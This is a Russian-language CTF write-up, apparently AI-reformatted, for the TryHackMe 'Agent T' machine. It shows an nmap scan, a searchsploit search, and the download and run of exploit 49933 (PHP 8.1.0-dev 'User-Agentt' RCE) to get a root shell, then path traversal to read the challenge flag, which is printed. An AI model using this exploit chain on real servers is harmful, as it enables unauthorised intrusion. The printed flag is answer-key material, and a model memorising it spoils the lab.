Отличный разбор! Ты всё сделал грамотно и по делу. Ниже — твой текст в красивом, структурированном виде, но **все твои слова сохранены без изменений**.

---

**Машина Agent T TryHackMe**

Как всегда начну со сканирования машинки утилитой nmap:

```
nmap -sV 10.80.179.240
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-13 10:06 -0400
Nmap scan report for 10.80.179.240
Host is up (0.049s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.29 seconds
```

Вижу один лишь открытый 80 порт, и-то старую версию php на нем, сразу ищем эксплойты через утилиту searchsploit:

```
searchsploit PHP 8.1.0-dev
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Axigen < 10.5.7 - Persistent Cross-Site Scripting                                                                                                         | php/webapps/51963.txt
Composr-CMS Version <=10.0.39 - Authenticated Remote Code Execution                                                                                       | php/webapps/51060.txt
Concrete5 CMS < 8.3.0 - Username / Comments Enumeration                                                                                                   | php/webapps/44194.py
cPanel < 11.25 - Cross-Site Request Forgery (Add User PHP Script)                                                                                         | php/webapps/17330.html
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                       | php/webapps/44449.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                                   | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                                   | php/remote/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                                          | php/webapps/44448.py
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                                     | php/remote/46510.rb
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                                     | php/remote/46510.rb
Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                                                                                            | php/webapps/46452.txt
Drupal < 8.6.9 - REST Module Remote Code Execution                                                                                                        | php/webapps/46459.py
FileRun < 2017.09.18 - SQL Injection                                                                                                                      | php/webapps/42922.py
Fozzcom Shopping < 7.94 / < 8.04 - Multiple Vulnerabilities                                                                                               | php/webapps/15571.txt
FreePBX < 13.0.188 - Remote Command Execution (Metasploit)                                                                                                | php/remote/40434.rb
IceWarp Mail Server < 11.1.1 - Directory Traversal                                                                                                        | php/webapps/44587.txt
KACE System Management Appliance (SMA) < 9.0.270 - Multiple Vulnerabilities                                                                               | php/webapps/46956.txt
Kaltura < 13.2.0 - Remote Code Execution                                                                                                                  | php/webapps/43028.py
Kaltura Community Edition < 11.1.0-2 - Multiple Vulnerabilities                                                                                           | php/webapps/39563.txt
Micro Focus Secure Messaging Gateway (SMG) < 471 - Remote Code Execution (Metasploit)                                                                     | php/webapps/45083.rb
Micro Focus Secure Messaging Gateway (SMG) < 471 - Remote Code Execution (Metasploit)                                                                     | php/webapps/45083.rb
NPDS < 08.06 - Multiple Input Validation Vulnerabilities                                                                                                  | php/webapps/32689.txt
OPNsense < 19.1.1 - Cross-Site Scripting                                                                                                                  | php/webapps/46351.txt
PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution                                                                                                       | php/webapps/49933.py
```

На последней строчке я вижу нужный нам эксплойт, его я буду скачивать, для этого мне нужна эта же утилита но с флагом -m и айди эксплойта:

```
searchsploit -m 49933     
  Exploit: PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution
      URL: https://www.exploit-db.com/exploits/49933
     Path: /usr/share/exploitdb/exploits/php/webapps/49933.py
    Codes: N/A
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/kali/49933.py
```

Запускаю эксплойт и ввожу url целевого сайта:

```
python 49933.py                               
Enter the full host url:
http://10.80.179.240/

Interactive shell is opened on http://10.80.179.240/ 
Can't acces tty; job crontol turned off.
```

Я получил оболочку, теперь самое интересное. Когда я пытался перейти в другую директорию и проверить что находится внутри, я пониал, что я не могу двигаться из этой директории, что бы я не делал, я не могу, хотя если пишу whoami, то система отвечает мне, что я root. Но я решил попробовать писать команды типа cd .. && ls и у меня получилось.

я начал проверять:

```
cd ../ && ls
cd ../../ && ls
cd ../../../ && ls
```

и на последней команде я увидел файл flag.txt. тогда я решил прочитать его тем же способом, что и путешествовал:

```
cat ../../../flag.txt
```

и увидел содержимое флага, а именно:

```
flag{4127d0530abf16d6d23973e3df8dbecb}
```
